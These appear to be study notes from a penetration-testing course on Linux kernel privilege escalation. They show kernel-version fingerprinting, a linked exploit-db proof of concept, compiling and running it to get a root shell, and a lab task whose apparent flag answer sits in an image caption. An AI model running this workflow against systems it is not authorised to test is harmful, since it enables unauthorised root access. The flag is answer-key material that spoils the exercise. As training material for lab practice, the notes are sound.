# Kernel Exploits

* [Dirty COW](https://github.com/dirtycow/dirtycow.github.io) (CVE-2016-5195) -> A very well-known kernel exploit
* Kernel exploit can be as simple as downloading, compiling, and running it.
* Some exploits work out of the box, while others require modification.
* A quick way to identify exploits is to run `uname -a` and search Google for the kernel version.

### Kernel Exploit Example

```shell-session
uname -a

Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

```shell-session
cat /etc/lsb-release 

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
```

* Linux Kernel 4.4.0-116

{% embed url="https://www.exploit-db.com/exploits/44298" %}
for `linux 4.4.0-116-generic exploit` comes up with this exploit PoC
{% endembed %}

We can compile the exploit code using [gcc](https://linux.die.net/man/1/gcc) and set the executable bit using `chmod +x`.

```shell-session
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```

Next, we run the exploit and hopefully get dropped into a root shell.

```shell-session
./kernel_exploit 

task_struct = ffff8800b71d7000
uidptr = ffff8800b95ce544
spawning root shell
```

Finally, we can confirm root access to the box.

```shell-session
root@htb[/htb]# whoami

root
```

## Assesment

Escalate privileges using the same Kernel exploit. Submit the contents of the flag.txt file in the /root/kernel\_exploit directory.

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption><p>46237b8aa523bc7e0365de09c0c0164f</p></figcaption></figure>
